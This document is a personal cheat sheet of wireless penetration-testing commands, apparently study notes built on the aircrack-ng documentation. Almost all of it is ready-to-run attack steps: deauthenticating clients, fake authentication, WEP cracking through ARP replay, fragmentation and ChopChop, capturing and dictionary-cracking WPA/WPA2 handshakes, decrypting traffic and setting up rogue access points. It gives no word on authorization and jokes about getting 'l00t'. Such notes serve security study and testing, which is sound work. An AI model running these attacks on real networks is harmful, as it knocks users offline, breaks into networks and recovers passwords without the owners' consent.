# Wireless Pentesting Notes
## For the purpose of this page I will be using wlan1 and wlan1mon to represent the network card I'm using.

# Familiarizing yourself with your tools
* iwconfig - what's going on?
* Get MAC address: macchanger --show [WiFi CARD]
* If you're struggling to get a specific packet (ARP) then try to deauthenticate a client.
* Kick off enumeration of an environment with airodump-ng and proceed from there.

# Airmon-ng - https://www.aircrack-ng.org/doku.php?id=airmon-ng
* airmon-ng [start|stop] wlan1 [channel]
* airmon-ng [check|check] kill
* iwlist wlan1mon [channel] - Show that the monitor mode interface is	listening	on the desired channel frequency
 
 # Airodump-ng - https://www.aircrack-ng.org/doku.php?id=airodump-ng
* airodump-ng wlan1 - Start airmon-ng first
* airodump-ng --bssid [BSSID] -c [CHANNEL] -w [FILENAME] wlan1 - Start airmon-ng on specific channel first

# Airreplay-ng - https://www.aircrack-ng.org/doku.php?id=aireplay-ng
* aireplay-ng -9 wlan1mon - Injection test 
* aireplay-ng -9 -i wlan0 wlan1mon - Card to Card attack Injection test

# WEP Fake Authentication Attack - https://www.aircrack-ng.org/doku.php?id=fake_authentication
* Start your WiFi card in monitor mode on a specific channel: airmon-ng start wlan1 [CHANNEL]
* Run airodump-ng and write to a file: airodump-ng -c [CHANNEL] –bssid [BSSID] -w [FILE] wlan1mon - if you don't specify the channel then it will hop whgen you perform an attack
* Perform the fake authentication attack: aireplay-ng -1 0 -e [ESSID] -a [BSSID] -h [OurMACAddress] wlan1mon
 
 # Deauthenticate Clients - https://www.aircrack-ng.org/doku.php?id=deauthentication
 * Run a deauthentication attack: aireplay-ng -0 1 -a [AP MAC] -c [Client MAC] wlan1mon

# ARP Request Relay Attack + WEP Cracking - https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
* Run airodump-ng while performing this attack and output the results to a file in order to run aircrack-ng on it with the following commands:
* Run airodump with the appropriate settings: airodump-ng -c [CHANNEL] --bssid [BSSID] -w [FILENAME] wlan1mon
* Ensure that you are authenticated into the network via a fake authentication attack: aireplay-ng -1 0 -e [ESSID] -a [AP MAC] -h [OurMACAddress] wlan1mon
* Launch the ARP request replay attack: aireplay-ng -3 -b [AP MAC] -h [OurMACAddress] wlan1mon
* While our previous command is running deauthenticate the victim:  aireplay-ng -0 1 -a [AP MAC] -c [CLIENT MAC] wlan1mon
* Once a large amount of IVs have been captured crack them with: air-crack.ng [FILENAME]
 
# Cracking WEP via Client - https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_via_a_wireless_client
* Set your WiFi card to monitor mode with airmon-ng
* Run airodump-ng and output to a file: airodump-ng -c [CHANNEL] --bssid [BSSID] -w [FILENAME] wlan1mon
* Fake authenticate to the AP: aireplay-ng -1 0 -e [ESSID] -a [AP MAC] -h [OurMACAddress] wlan1mon
* Natural packet replay: aireplay-ng -2 -b [AP MAC] -d FF:FF:FF:FF:FF:FF -t 1 wlan1mon 
* Modified packet replay: aireplay-ng -2 -b [AP MAC] -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 wlan1mon
* Running the attack: aireplay-ng -2 -b [AP MAC] -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan1mon
* Replay from file: aireplay-ng -2 -r [CAPTURE] wlan1mon
* Crack ze key: aircrack-ng -z [CAPTURE]

# Fragmentation Attack - https://www.aircrack-ng.org/doku.php?id=fragmentation
* Use this when there are no clients authenticated to the AP.
* Set your WiFi card to monitor mode with airmon-ng
* Run airodump-ng and output to a file: airodump-ng -c [CHANNEL] --bssid [BSSID] -w [FILENAME] wlan1mon
* Fake authenticate and send keep alive packets: aireplay-ng -1 6000 -e [ESSID] -b [AP MAC] -h [OurMACAddress] wlan1mon
* Launch fragmentation attack with airreplay.ng: aireplay-ng -5 -b [AP MAC] -h [OurMACAddress] wlan1mon
* Use packetforge-ng to generate an ARP request packet with the XOR file: packetforge-ng -0 -a [AP MAC] -h [OurMACAddress] -l [SourceIP e.g. 192.168.1.100] -k [DestinationIP e.g. 192.168.1.255] -y [.xor FILE] -w arprequest
* Replay this packet with aireplay.ng: aireplay.ng -2 -r arprequest.cap wlan1mon

# KoreK ChopChop Attack - https://www.aircrack-ng.org/doku.php?id=korek_chopchop
* Start airodump with the appropriate settings: airodump-ng -c [CHANNEL] --bssid [BSSID] -w [FILENAME] wlan1mon
* Fake authentication: aireplay-ng -1 0 -e [ESSID] -a [BSSID] -h [OurMACAddress] wlan1mon
* Perform the KoreK ChopChop attack: aireplay-ng -4 -b [AP MAC] -h [OurMacAddress] wlan1mon
* Identify the packet a little more to discover information about the network: tcpdump -s 0 -n -e -r <CAPTURE>  
* Craft a packet to replay: packetforge-ng -0 -a [AP MAC] -h [OurMACAddress] -l [SourceIP e.g. 192.168.1.100] -k [DestinationIP e.g. 192.168.1.255] -y [.xor FILE] -w arpkorek
* Replay this packet with aireplay.ng: aireplay.ng -2 -r arprequest.cap wlan1mon
* Run aircrack-ng against the packet capture while replaying to crack the key and get l00t.

# Shared-key Fake Authentication - https://www.aircrack-ng.org/doku.php?id=shared_key
* Start airodump-ng: airodump-ng -c [CHANNEL] --bssid [BSSID] -w [FILENAME] wlan1mon
* Deauthenticate a client copnnected to the AP: aireplay-ng -0 1 -a [AP MAC] -c [Client MAC] wlan1mon
* Wait for a notification in airodump-ng stating that the keystream has been captured which will generate a .xor file
* Attempt to authenticate using the capture: aireplay-ng -1 0 -e [ESSID] -y [.xor FILENAME] -a [AP MAC] -h [OurMACAddress] wlan1mon
* We can also modify the above authentication with an association timing to prevent timeouts: aireplay-ng -1 6000 -e [ESSID] -y [.xor FILENAME] -a [AP MAC] -h [OurMACAddress] wlan1mon
* This will give us a foothold to carry out other attacks such as ARP replaying and utilizing aircrack.ng
* If we were to pursue this approach we could run the following command: aireplay-ng -3 -b [AP MAC] -h [OurMACAddress] wlan1mon
* Finally, we would run aircrack.ng while running the ARP replay attack to get l00t. 

# Cracking	WPA/WPA2	PSK with Aircrack-ng - https://www.aircrack-ng.org/doku.php?id=cracking_wpa
* Aircrack.ng can only crack WPA/WPA2 networks that use PSK. If the authentication type is not shown as PSK then do not bother trying :D
* Start your capture: airodump-ng -c [CHANNEL] --bssid [BSSID] -w [FILENAME] wlan1mon
* Let's deauthenticate a client to capture the handshake: aireplay-ng -0 1 -a [AP MAC] -c [Client MAC] wlan1mon
* We can then crack this handshake with our beloved aircrack.ng: aircrack.ng -w /usr/share/wordlists/rockyou.txt [FILENAME]
* If you get a message is returned that "No valid WPA handshakes were found" try deauthenticating the client again and capturing a new handshake.

# Airolib-ng - https://www.aircrack-ng.org/doku.php?id=airolib-ng
* Let's speed up our cracking of the WPA handshake.
* Create file with AP ESSID in it: echo apessid > apessid.txt 
* Import into the database: airolib-ng [db name] --import apessid [apessid.txt]
* View information stored in the database: airolib-ng [db name] --stats
* Import wordlist into the database: airolib-ng test --import passwd /usr/share/wordlists/rockyou.txt
* Have airolib-ng do some magic: airolib-ng test --batch
* We can now use aircrack-ng with our newly created database: aircrack-ng -r test <CAPTUREFILE>
 
# WPA Cracking with coWPAtty - https://github.com/joswr1ght/cowpatty
* Follow the usual steps to obtain a WPA handshake. 
* Dictionary mode: cowpatty -r [CAPTURE] -f /usr/share/wordlists/rockyou.txt -2 -s [ESSID]
* The following instructions will detail coWPAtty rainbow table mode:
* Similar to John, let's create some requirements: genpmk -f /usr/share/wordlists/rockyou.txt -d cowhash.txt -s <ESSID>
* Now let's get cracking: cowpatty -r [CAPTURE] -d cowhash.txt -2 -s <ESSID>

# WPA Cracking with Pyrit - https://github.com/JPaulMora/Pyrit
* I have removed Pyrit as it is no longer contained in the default repos of Kali. I strongly believe that aircrack-ng and coWPAtty are sufficient enough. However, Pyrit is still useful in some cases so I have included it in these notes.
 
# Airdecap-ng - https://www.aircrack-ng.org/doku.php?id=airdecap-ng
* Remove wireless headers: airdecap-ng -b [AP MAC] [CAPTURE]
* Decrypt WEP: airdecap-ng -w [WEPKey] -b [AP MAC] [CAPTURE]
* Decrypt WPA: airdecap-ng -e [ESSID] -p [WPAPass] -b [AP MAC] [CAPTURE]
* Pentesting only begins once you recover these keys! Be creative, use the information gained to discover footholds and l00t. 

# Airserv-ng - https://www.aircrack-ng.org/doku.php?id=airserv-ng
* Start airserv-ng on port 6969: airserv-ng -p 6969 -d wlan1mon
* Now let's connect to this wireless card: airodump-ng -c [CHANNEL] --bssid [BSSID] [IP]:6969

# Airgraph-ng - https://www.aircrack-ng.org/doku.php?id=airgraph-ng
* This uses the csv file dumped by airodump-ng to create graphs. 
* Generate Clients to AP Relationship (CAPR) Graph: airgraph-ng -i [CSVFile] -g CAPR -o [FILENAME]
* Generate Client Probe Graph (CPG): airgraph-ng -i [CSVFile] -g CPG -o [FILENAME]

# Airbase-ng - https://www.aircrack-ng.org/doku.php?id=airbase-ng
* Rouge access points! =-D
* Set up a fake access point: airbase-ng -c [CHANNEL] -e [ESSID] -s -W 1 wlan1mon
* Capture handshakes: airbase-ng -c [CHANNEL] -e [ESSID] -z 2 -W 1 wlan1mon
* We can crack whatever we get with aircrack-ng. 

# Example John the Ripper Rules - https://www.openwall.com/john/doc/RULES.shtml
* cd /usr/share/john
* nano/vim john.conf
* Search for List.Rules:Wordlist
* Add the following two rules:
1. $[0-9]$[0-9]
2. $[0-9]$[0-9]$[0-9]
* Use these rules in aircrack-ng: john wordlist=[WORDLIST] --rules --stdout | aircrack-ng -e [ESSID] -w - [CAPTURE]

# General Approach to Cracking WEP keys - https://www.aircrack-ng.org/doku.php?id=aircrack-ng#general_approach_to_cracking_wep_keys
* The number of initialization vectors (IVs) that you need to determine the WEP key varies dramatically by key length and access point. Typically you need 250,000 or more unique IVs for 64 bit keys and 1.5 million or more for 128 bit keys. 
* Generally, don't try to crack the WEP key until you have 200,000 IVs or more. If you start too early, aircrack tends to spend too much time brute forcing keys and not properly applying the statistical techniques. 
* Start by trying 64 bit keys “aircrack-ng -n 64 [FILENAME]"
*  It is surprising how many APs only use 64 bit keys. If it does not find the 64 bit key in 5 minutes, restart aircrack in the generic mode: “aircrack-ng captured-data.cap”. Then at each 100,000 IVs mark, retry the “aircrack-ng -n 64 captured-data.cap” for 5 minutes.
* Once you hit 600,000 IVs, switch to testing 128 bit keys. At this point it is unlikely (but not impossible) that it is a 64 bit key and 600,000 IVs did not crack it. So now try “aircrack-ng captured-data.cap”.
* Once you hit 2 million IVs, try changing the fudge factor to “-f 4”. Run for at least 30 minutes to one hour. Retry, increasing the fudge factor by adding 4 to it each time. Another time to try increasing the fudge factor is when aircrack-ng stops because it has tried all the keys.
